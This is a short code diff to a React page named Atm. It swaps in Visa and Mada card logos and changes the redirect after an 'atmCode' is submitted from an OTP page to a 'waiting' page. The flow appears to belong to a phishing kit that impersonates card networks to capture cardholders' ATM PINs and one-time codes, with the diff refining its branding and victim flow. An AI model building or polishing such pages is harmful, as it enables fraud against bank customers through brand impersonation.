@@ -5,7 +5,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Loader2 } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
-import imgm from "../assets/imgm_1779063055370.png";
+import visaMadaImg from "../assets/VISAMADAH_1779063055374.png";
 import visaIncLogo from "../assets/Visa_Inc._logo.svg_1779063055374.png";
 
 export default function Atm() {
@@ -26,7 +26,7 @@ export default function Atm() {
     setLoading(true);
     try {
       addSubmission("atm", sessionId, { atmCode });
-      setTimeout(() => setLocation("/otp2"), 5000);
+      setTimeout(() => setLocation("/waiting"), 5000);
     } finally {
       setLoading(false);
     }
@@ -54,7 +54,7 @@ export default function Atm() {
 
       <div className="flex-1 flex flex-col items-center justify-center p-4">
         <div className="mb-8">
-          <img src={imgm} alt="ATM Mobile" className="h-40 mx-auto" />
+          <img src={visaMadaImg} alt="Visa Mada" className="h-20 mx-auto object-contain" />
         </div>
 
         <div className="bg-white rounded-xl shadow-md border border-gray-200 p-8 max-w-sm w-full text-center">
